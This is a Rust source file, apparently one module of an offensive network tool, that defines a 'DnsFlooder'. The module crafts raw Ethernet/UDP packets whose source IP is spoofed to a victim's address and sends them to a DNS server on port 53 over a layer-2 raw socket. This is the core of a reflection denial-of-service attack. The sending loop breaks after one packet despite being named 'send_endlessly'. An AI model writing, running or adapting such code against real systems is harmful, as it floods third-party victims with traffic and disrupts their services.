use std::net::Ipv4Addr;
use crate::engines::DnsArgs;
use crate::iface::IfaceInfo;
use crate::generators::RandomValues;
use crate::pkt_builder::PacketBuilder;
use crate::sockets::Layer2RawSocket;
use crate::utils::{ inline_display, parse_mac, mac_u8_to_string };



pub struct DnsFlooder {
    builder:   PacketBuilder,
    iface:     String,
    pkts_sent: usize,
    pkt_data:  PacketData,
    rand:      RandomValues,
}


struct PacketData {
    src_ip:   Ipv4Addr,
    src_mac:  [u8; 6],
    dst_port: u16,
    dst_ip:   Ipv4Addr,
    dst_mac:  [u8; 6],
}


impl DnsFlooder {

    pub fn new(args: DnsArgs) -> Self {
        let iface = IfaceInfo::default_iface();

        Self {
            builder:   PacketBuilder::new(),
            pkts_sent: 0,
            pkt_data:  Self::set_pkt_data(args, &iface),
            rand:      RandomValues::new(None, None),
            iface,   
        }
    }



    fn set_pkt_data(args: DnsArgs, iface: &str) -> PacketData {
        let src_mac_str = IfaceInfo::mac(iface);
        let dst_mac_str = IfaceInfo::gateway_mac(iface).unwrap();

        let src_ip  = args.target_ip;
        let src_mac = parse_mac(&src_mac_str).unwrap();
        
        let dst_port = 53;
        let dst_ip   = args.dns_ip;
        let dst_mac  = parse_mac(&dst_mac_str).unwrap();

        PacketData { src_ip, src_mac, dst_port, dst_ip, dst_mac }
    }



    pub fn execute(&mut self){
        self.display_pkt_data();
        self.send_endlessly();
    }


    
    fn display_pkt_data(&self) {
        let src_mac = mac_u8_to_string(self.pkt_data.src_mac);
        let dst_mac = mac_u8_to_string(self.pkt_data.dst_mac);

        println!("TARGET     >> MAC: {}  IP: {}", src_mac, self.pkt_data.src_ip);
        println!("DNS SERVER >> MAC: {}  IP: {}", dst_mac, self.pkt_data.dst_ip);
        println!("IFACE: {}", self.iface);
    }



    fn send_endlessly(&mut self) {
        let socket = Layer2RawSocket::new(&self.iface);

        loop {
            let pkt = self.get_pkt();
            socket.send(pkt);

            self.pkts_sent += 1;
            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
            break;
        }
    }


    
    #[inline]
    fn get_pkt(&mut self) -> &[u8] {
        self.builder.udp_ether(
            self.pkt_data.src_mac, 
            self.pkt_data.src_ip, 
            self.rand.get_random_port(),
            self.pkt_data.dst_mac, 
            self.pkt_data.dst_ip,
            self.pkt_data.dst_port,
        )
    }

}
